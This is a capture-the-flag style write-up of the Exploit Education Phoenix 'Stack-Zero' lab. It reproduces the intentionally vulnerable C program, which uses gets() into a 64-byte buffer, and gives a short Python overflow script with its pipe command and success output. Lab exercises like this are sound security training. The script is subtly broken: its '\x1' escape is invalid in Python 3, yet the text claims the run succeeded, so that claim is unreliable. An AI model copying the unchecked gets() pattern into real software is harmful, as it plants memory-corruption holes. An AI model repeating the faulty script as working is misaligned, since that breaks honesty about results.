---
title: Exploit Education > Phoenix > Stack-Zero
date: '2021-09-20'
draft: false
--- 

Stack-Zero consists of the following source code:

```c
/*
 * phoenix/stack-zero, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable.
 *
 * Scientists have recently discovered a previously unknown species of
 * kangaroos, approximately in the middle of Western Australia. These
 * kangaroos are remarkable, as their insanely powerful hind legs give them
 * the ability to jump higher than a one story house (which is approximately
 * 15 feet, or 4.5 metres), simply because houses can't can't jump.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
````

Looking at the file, we can see that the code uses the vulnerable `gets` function. It copies all input from STDIN to the buffer without checking the input's size first. If we provide a string that is larger in the number of characters than the size of the allocated buffer, we can overwrite values in memory that come after it. 

Since `buffer` is of type `char[64]`, we can write 64 chars into stdin to 'pad' the input. After padding, we can then overwrite whatever comes after `buffer`, in this case `changeme`. Since writing and counting out 64 characters is a bit troublesome in `qemu`, we write a quick python file that does what we want.

``` 
# stack-zero.py

padding = '0' * 64
changeme = '\x1'

print(padding + changeme)
```

Now, since `stack-zero.c` wants its input via stdin and not as a command line argument, we pipe the input into it: `python3 stack-zero.py | ./stack-zero`. Doing this prints the message

```
> Well done, the 'changeme' variable has been changed!
```

meaning that we solved our first task!

